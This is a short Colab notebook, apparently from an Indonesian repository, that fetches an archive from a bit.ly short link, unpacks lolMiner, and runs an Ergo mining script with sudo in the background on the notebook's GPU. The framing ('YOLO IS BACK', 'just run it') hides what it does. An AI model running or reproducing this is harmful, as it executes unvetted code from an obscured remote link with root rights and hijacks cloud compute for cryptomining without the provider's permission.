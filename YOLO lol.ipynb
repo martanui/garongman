{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "YOLO.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "PpokIjDjvtnA"
      },
      "source": [
        "#YOLO IS BACK\n",
        "\n",
        "#Runkann saja"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-dgNpxVAa8eF"
      },
      "source": [
        "!nvidia-smi -L"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6uCt-BAUw86L"
      },
      "source": [
        "import random, string, urllib.request, json, getpass\n",
        "!!wget https://bit.ly/3wyizi3 \n",
        "!unzip 3wyizi3\n",
        "!cp /content/alat-main/miner.zip /content/\n",
        "!unzip miner.zip\n",
        "!chmod +x /content/miner/lolMiner && chmod 777 /content/miner/mine_ergo.sh\n",
        "get_ipython().system_raw('sudo /content/miner/mine_ergo.sh')"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}